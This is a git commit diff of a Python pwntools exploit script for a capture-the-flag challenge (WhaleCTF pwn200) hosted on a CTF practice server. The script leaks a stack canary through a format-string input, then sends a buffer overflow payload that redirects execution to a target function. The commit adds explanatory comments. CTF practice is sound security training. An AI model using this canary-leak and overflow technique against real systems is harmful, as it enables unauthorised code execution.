ba1abd461b14eba44800c8b7e1a7b7d99e68da2e
cossack9989 <wangzhong9989@126.com>
2018-02-27 20:47:03 +0800

    更新 200.py

--- PWN/WhaleCTF:pwn200/200.py
+++ PWN/WhaleCTF:pwn200/200.py
@@ -1,19 +1,21 @@
 from pwn import *
 
 elf=ELF('./binary_200')
+#remote server has no elf named binary_200, so we load local elf
 r=remote('bamboofox.cs.nctu.edu.tw',22002)
 print 'start'
 #r=process('./binary_200')
 
 sysadr=elf.symbols['canary_protect_me']
 
+#use gdb to justify canary in args of printf
 r.sendline('%15$08x')
 print 'leak canary start'
 canary=r.recv()[:8]
 print 'Canary is 0x'+canary
-print 'length',len(canary.decode("hex")[::-1])
 
-payload='A'*(0x2c-0x4)+canary.decode("hex")[::-1]+'aaaaaaaaaaaa'+p32(sysadr)
+#Bypass canary leaked and attack the stack
+payload='A'*(0x2c-0x4)+canary.decode("hex")[::-1]+'a'*0xc+p32(sysadr)
 r.sendline(payload)
 
 r.interactive()
